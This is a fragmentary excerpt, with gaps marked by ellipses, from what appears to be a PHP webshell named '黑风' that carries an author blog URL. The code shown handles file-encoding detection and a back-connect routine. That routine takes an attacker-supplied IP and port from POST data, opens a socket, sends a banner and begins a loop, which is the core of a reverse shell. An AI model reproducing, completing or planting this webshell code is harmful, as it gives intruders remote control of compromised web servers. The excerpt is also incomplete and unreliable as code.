...
// 其它变量定义
$shellname='黑风';
$myurl='http://blog.163.com/yuanbiao123456@126';
			...
			if (substr(PHP_VERSION,0,1)>=5){
				if(empty($_GET['charset'])){
					if(TestUtf8($FILE_CODE)>1){
						$charset= 'UTF-8';$FILE_CODE = iconv("UTF-8","gb2312//IGNORE",$FILE_CODE);
					}else{
						$charset= 'GB2312';
					}
				}else{
...
END;
		if((!empty($_POST['mip'])) && (!empty($_POST['bport']))){
			...
			if (!$fp){
				...
				fputs ($fp ,"\n*********************************************\n 
			        http://blog.163.com/yuanbiao123456@126 is ok
			        \n*********************************************\n\n");
				while(!feof($fp)){
